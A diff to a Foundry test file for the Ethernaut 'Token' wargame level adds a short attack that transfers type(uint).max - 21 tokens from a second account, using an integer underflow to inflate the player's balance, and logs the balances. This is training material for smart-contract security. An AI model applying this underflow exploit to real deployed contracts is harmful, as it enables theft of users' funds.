@@ -26,10 +26,15 @@ contract TokenTest is Test {
         address levelAddress = ethernaut.createLevelInstance(tokenFactory);
         Token ethernautToken = Token(payable(levelAddress)); // 1000 is initial supply
         vm.stopPrank();
+        console.log("Balance of player: %s", ethernautToken.balanceOf(player));
         /****************
          *    Attack     *
          *************** */
-
+        vm.startPrank(player2);
+        ethernautToken.transfer(player, type(uint).max - 21  );
+        console.log("Balance of player: %s", ethernautToken.balanceOf(player));
+        vm.stopPrank();
+        vm.startPrank(player);
         /*****************
          *Level Submission*
          ***************  */
